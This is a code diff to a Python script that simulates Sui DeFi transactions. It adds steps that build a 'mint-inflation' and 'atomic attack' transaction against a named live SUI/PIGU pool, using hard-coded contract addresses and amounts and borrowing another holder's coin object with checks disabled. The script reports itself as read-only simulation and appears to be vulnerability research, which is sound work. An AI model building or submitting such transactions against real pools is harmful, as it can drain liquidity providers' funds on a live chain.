@@ -64,8 +64,8 @@ class B:
         return {"sender": SENDER, "kind": {"kind": "PROGRAMMABLE_TRANSACTION",
                 "programmableTransaction": {"inputs": self.inputs, "commands": self.commands}}}
 
-def sim(name, tx):
-    body = json.dumps({"query": Q, "variables": {"tx": tx, "checks": True, "gasSelect": True}}).encode()
+def sim(name, tx, checks=True):
+    body = json.dumps({"query": Q, "variables": {"tx": tx, "checks": checks, "gasSelect": True}}).encode()
     last_err = None
     for attempt in range(8):
         try:
@@ -84,15 +84,22 @@ def sim(name, tx):
                 try: ej = json.loads(ej)
                 except Exception: ej = None
             oc = []
-            for c in ((ej or {}).get("objectChanges") or []):
-                if c.get("objectType", "").endswith("::sui::SUI") or True:
-                    oc.append(c)
+            if isinstance(ej, dict):
+                for c in (ej.get("objectChanges") or ej.get("changedObjects") or []):
+                    if isinstance(c, dict):
+                        oc.append(c)
+            outs = res.get("outputs")
+            rv = []
+            if isinstance(outs, dict):
+                rv = outs.get("returnValues") or []
+            elif isinstance(outs, list):
+                rv = outs
             return {"name": name, "ok": True, "status": eff.get("status"), "digest": eff.get("digest"),
                     "abortCode": err.get("abortCode"), "error": (err.get("message") or None),
                     "error_function": ((err.get("function") or {}).get("name")),
                     "error_module": ((err.get("module") or {}).get("name")),
                     "objectChanges": oc[:25],
-                    "returnValues": ((res.get("outputs") or {}).get("returnValues") or [])[:4]}
+                    "returnValues": rv[:4]}
         except Exception as e:
             last_err = f"{type(e).__name__}: {str(e)[:200]}"
             time.sleep(2.0 * (attempt + 1))
@@ -149,6 +156,62 @@ def main():
            [{"kind": "RESULT", "result": 3}, lp, b.u64(0), b.u64(0), {"kind": "INPUT", "input": 0}])
     b.transfer([{"kind": "RESULT", "result": 2, "subresult": 0}, {"kind": "RESULT", "result": 2, "subresult": 1}], s)
     results.append(sim("s6_v12_roundtrip_gate", b.build()))
+
+    # s7/s8: live V1-v6 mint-inflation on the desynced pool 0x99c63597... (SUI/PIGU).
+    # Uses an existing PIGU coin object as input (any holder); checks disabled so the
+    # object can be referenced. Read-only simulation.
+    try:
+        PIGU = "0xfc71274a94f5d9cd1ae6928ecfc9fa910d03eb28258fddeb9842ac3c7b4f3ae6::pigu::PIGU"
+        q = """query($t: String!) { objects(first: 5, filter: {type: $t}) { nodes { address version digest asMoveObject { contents { json } } } } }"""
+        def _gql(query, variables):
+            b2 = json.dumps({"query": query, "variables": variables}).encode()
+            for _ in range(4):
+                try:
+                    req = urllib.request.Request(GQL, data=b2, headers=UA)
+                    with urllib.request.urlopen(req, timeout=60) as r:
+                        return json.loads(r.read())["data"]
+                except Exception:
+                    time.sleep(2)
+            raise RuntimeError("gql failed in s7/s8")
+        d = _gql(q, {"t": f"0x2::coin::Coin<{PIGU}>"})
+        cand = None
+        for n in d["objects"]["nodes"]:
+            j = (n.get("asMoveObject") or {}).get("contents", {}).get("json") or {}
+            if int(j.get("balance") or 0) >= 5_400_000:
+                cand = n; break
+        if cand:
+            def coin_ref(b, i):
+                b.inputs.append({"kind": "IMMUTABLE_OR_OWNED", "objectId": cand["address"],
+                                 "version": str(cand["version"]), "digest": cand["digest"]})
+                return {"kind": "INPUT", "input": len(b.inputs) - 1}
+            # s7: V1 mint leg
+            b = B(); b.split([43_319])
+            cr = coin_ref(b, 0)
+            b.commands.append({"splitCoins": {"coin": cr, "amounts": [b.u64(5_277_399)]}})
+            b.move(V1, "router", "add_liquidity", [SUI_T, PIGU],
+                   [b.u64(43_319), {"kind": "RESULT", "result": 0}, b.u64(5_277_399), {"kind": "RESULT", "result": 1},
+                    b.u64(0), b.u64(0), {"kind": "INPUT", "input": 0}])
+            results.append(sim("s7_v1_mint_inflation", b.build(), checks=False))
+            # s8: atomic v6 add_liquidity_returns -> v6 remove_liquidity
+            V6 = "0xa00faab58ff6876dce096d5e0591200b84a14f4033319d27c48b781a37aa2ed7"
+            b = B()
+            sender2 = b.address(SENDER)
+            b.split([43_319])
+            cr2 = coin_ref(b, 0)
+            b.commands.append({"splitCoins": {"coin": cr2, "amounts": [b.u64(5_277_399)]}})
+            b.move(V6, "router", "add_liquidity_returns", [SUI_T, PIGU],
+                   [b.u64(43_319), {"kind": "RESULT", "result": 0}, b.u64(5_277_399), {"kind": "RESULT", "result": 1},
+                    b.u64(0), b.u64(0), {"kind": "INPUT", "input": 0}])
+            lp2 = {"kind": "RESULT", "result": 2, "subresult": 2}
+            b.move(SUI, "coin", "value", [f"{V1}::swap::LSP<{SUI_T},{PIGU}>"], [lp2])
+            b.move(V6, "router", "remove_liquidity", [SUI_T, PIGU],
+                   [{"kind": "RESULT", "result": 3}, lp2, b.u64(0), b.u64(0), {"kind": "INPUT", "input": 0}])
+            b.transfer([{"kind": "RESULT", "result": 2, "subresult": 0}, {"kind": "RESULT", "result": 2, "subresult": 1}], sender2)
+            results.append(sim("s8_v6_atomic_attack", b.build(), checks=False))
+        else:
+            results.append({"name": "s7_s8_skipped", "ok": False, "err": "no suitable PIGU coin found"})
+    except Exception as e:
+        results.append({"name": "s7_s8_skipped", "ok": False, "err": str(e)[:200]})
 
     summary = {"generated_at_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "note": "read-only simulations; nothing signed/sent",
